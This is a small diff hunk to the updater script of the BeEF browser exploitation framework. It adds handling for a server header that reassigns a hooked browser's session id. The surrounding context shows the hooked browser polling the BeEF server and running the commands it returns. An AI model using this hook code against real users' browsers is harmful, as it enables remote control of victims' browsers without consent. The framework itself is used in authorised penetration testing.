@@ -59,6 +59,14 @@ beef.updater = {
 		try {
 			this.lock = true;
             beef.net.request(beef.net.httpproto, 'GET', beef.net.host, beef.net.port, beef.net.hook, null, beef.updater.beefhook+'='+beef.session.get_hook_session_id(), 5, 'script', function(response) {
+                // If the server reallocated a colliding identifier, adopt the
+                // canonical session id before any further polling.
+                if (beef.session.stable_sessions_enabled && response && response.headers) {
+                    var match = response.headers.match(/X-BeEF-Reallocated-Session:\s*([^\r\n]+)/i);
+                    if (match && match[1]) {
+                        beef.session.set_hook_session_id(match[1].trim());
+                    }
+                }
                 if (response.body != null && response.body.length > 0)
                     beef.updater.execute_commands();
             });
